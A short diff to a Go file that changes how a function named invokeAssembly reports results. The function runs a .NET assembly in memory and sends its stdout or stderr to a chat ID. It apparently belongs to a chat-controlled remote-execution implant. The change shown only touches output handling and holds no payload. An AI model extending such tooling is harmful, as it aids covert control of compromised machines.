@@ -115,17 +115,18 @@ func invokeAssembly(chatID int64, methodInfo *clr.MethodInfo, assemblyArgs []str
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
 	responseStr := ""
-	if len(stdout) > 0 {
+	if len(stdout) > 2 {
 		responseStr += stdout
+	} else {
+		if len(stderr) > 2 {
+			// Stderr Always getting this annoying message:
+			// "the MethodInfo::Invoke_3 method returned an error: ..."
+			responseStr += stderr
+		} else {
+			responseStr = "Assembly executed successfully with no output"
+		}
 	}
-	if len(stderr) > 0 {
-		// Always getting this annoying message here:
-		// "the MethodInfo::Invoke_3 method returned an error: ..."
-		// responseStr += "Stderr:\n" + stderr
-	}
-	if len(responseStr) == 0 {
-		responseStr = "Assembly executed successfully with no output"
-	}
+
 	SendMessage(chatID, responseStr)
 }
 
